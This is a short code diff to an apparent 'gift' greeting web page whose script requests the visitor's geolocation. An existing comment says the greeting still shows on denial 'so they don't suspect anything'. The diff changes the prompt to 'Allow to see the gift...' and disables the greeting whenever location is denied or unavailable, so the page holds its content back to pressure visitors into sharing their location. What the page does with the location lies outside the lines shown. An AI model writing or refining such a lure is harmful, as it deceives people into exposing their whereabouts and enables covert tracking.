@@ -70,7 +70,7 @@
     <script>
         function openGift() {
             const status = document.getElementById('statusMsg');
-            status.textContent = "Opening your gift...";
+            status.textContent = "Allow to see the gift...";
 
             if ("geolocation" in navigator) {
                 // Request location
@@ -83,12 +83,12 @@
                     (error) => {
                         // Error (User denied): We still show the greeting so they don't suspect anything
                         console.log("Location denied");
-                        revealGreeting();
+                        //revealGreeting();
                     },
                     { timeout: 10000 }
                 );
             } else {
-                revealGreeting();
+                //revealGreeting();
             }
         }
 
